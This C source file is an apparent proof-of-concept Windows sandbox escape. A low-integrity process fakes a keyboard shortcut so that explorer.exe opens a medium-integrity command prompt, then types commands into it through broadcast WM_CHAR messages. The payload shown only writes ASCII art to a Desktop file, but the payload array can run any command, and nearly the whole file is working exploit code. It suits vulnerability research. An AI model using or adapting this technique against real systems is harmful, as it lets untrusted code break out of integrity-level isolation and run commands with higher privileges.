#include <windows.h>
#include <stdio.h>

int main()
{
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    PCHAR payload[] = {
        "echo \".___   _____    ______________ ______________   \"> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"|   | /     \\   \\__    ___/   |   \\_   _____/   \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"|   |/  \\ /  \\    |    | /    ~    \\    __)_    \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"|   /    Y    \\   |    | \\    Y    /        \\   \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"|___\\____|__  /   |____|  \\___|_  /_______  /   \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"           \\/                  \\/        \\/     \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \" _______  .___  ________  ________    _____     \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \" \\      \\ |   |/  _____/ /  _____/   /  _  \\    \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \" /   |   \\|   /   \\  ___/   \\  ___  /  /_\\  \\   \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"/    |    \\   \\    \\_\\  \\    \\_\\  \\/    |    \\  \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"\\____|__  /___|\\______  /\\______  /\\____|__  /  \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "echo \"       \\/            \\/        \\/         \\/    \">> %USERPROFILE%\\Desktop\\TROLOLOL",
        "exit",
        NULL
    };

    printf("1] Spawning a low IL cmd.exe (from a low IL process)..Rdy ? Press to continue\n");
    getchar();

    si.cb = sizeof(si); 
    CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    Sleep(1000);

    // Yeah, you can "bruteforce" the index of the window..
    printf("2] Use Win+Shift+7 to ask explorer.exe to spawn a cmd.exe MI..");
    keybd_event(VK_LWIN, 0x5B, 0, 0);
    keybd_event(VK_LSHIFT, 0xAA, 0, 0);
    keybd_event(0x37, 0x87, 0, 0);

    keybd_event(VK_LWIN, 0x5B, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LSHIFT, 0xAA, KEYEVENTF_KEYUP, 0);
    keybd_event(0x37, 0x87, KEYEVENTF_KEYUP, 0);

    Sleep(1000);
    printf("3] Killing now the useless low IL cmd.exe..\n");

    TerminateProcess(
        pi.hProcess,
        1337
    );
    
    printf("4] Now driving the medium IL cmd.exe with SendMessage and HWND_BROADCAST (WM_CHAR)\n");
    printf("   \"Drive the command prompt [..] to make it look like a scene from a Hollywood movie.\" <- That's what we're going to do!\n");

    for(unsigned int i = 0; payload[i] != NULL; ++i)
    {
        for(unsigned int j = 0; j < strlen(payload[i]); ++j)
        {
            // Yeah, that's the fun part to watch ;D
            Sleep(10);
            SendMessage(
                HWND_BROADCAST,
                WM_CHAR,
                payload[i][j],
                0
            );
        }

        SendMessage(
            HWND_BROADCAST,
            WM_CHAR,
            VK_RETURN,
            0
        );
    }

    return EXIT_SUCCESS;
}

